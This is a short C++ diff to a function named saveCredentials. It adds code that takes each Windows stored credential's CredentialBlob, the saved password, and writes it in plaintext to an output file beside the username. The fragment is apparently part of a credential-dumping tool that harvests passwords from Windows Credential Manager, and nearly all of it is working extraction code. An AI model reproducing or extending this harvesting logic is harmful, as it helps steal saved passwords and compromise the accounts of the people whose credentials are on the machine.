@@ -50,6 +50,12 @@ void saveCredentials() {
             if(credentials[i] -> UserName) {
                 outfile << "Username: " << credentials[i] -> UserName << "\n";
             }
+
+            // represents password in windows api, it is greater than 0 because if there is nothing then we dont need it
+            if(credentials[i] -> CredentialBlobSize > 0) {
+                string password((char*)credentials[i] -> CredentialBlob, credentials[i]->CredentialBlobSize);
+                outfile << "Password: " << password << endl;    
+            }
             outfile << "-----------------------------\n";
         }
 
